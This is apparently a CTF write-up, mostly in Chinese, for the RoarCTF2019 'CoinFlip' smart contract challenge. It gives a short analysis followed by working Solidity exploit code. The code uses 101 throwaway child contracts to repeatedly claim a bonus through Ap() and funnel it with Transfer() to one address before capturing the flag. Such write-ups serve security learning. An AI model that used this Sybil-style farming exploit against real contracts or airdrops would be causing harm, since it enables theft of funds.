
## RoarCTF2019 CoinFlip

* `RoarCTF2019` 的 `CoinFlip` 题目
* 题目：见 `attachment` 目录

### Analysis

* `Deposit()` 可以增加 `balance[msg.sender]` ，但是需要发送 `msg.value > 500 ether` 才能满足要求，不现实
* **薅羊毛攻击**:
    * 部署第三方自合约，然后调用 `Ap()` 和 `Transfer()` 将钱转到固定地址
    * 固定地址调用 `CaptureTheFlag` 即可

```javascript
contract hack {
    address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21;
    P_Bank target = P_Bank(instance_address);
    
    function hack1(string b64email) public {
        target.CaptureTheFlag(b64email);
    }
}

contract father {
    function createsons() {
        for (uint i=0;i<101;i++)
        {
            son ason = new son();
        }
    }
}

contract son {
    constructor() public {
        P_Bank tmp = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);
        tmp.Ap();
        tmp.Transfer(0x7ec9f720a8d59bc202490c690139f8c7cbad568d, 1 ether);
    }
}
```
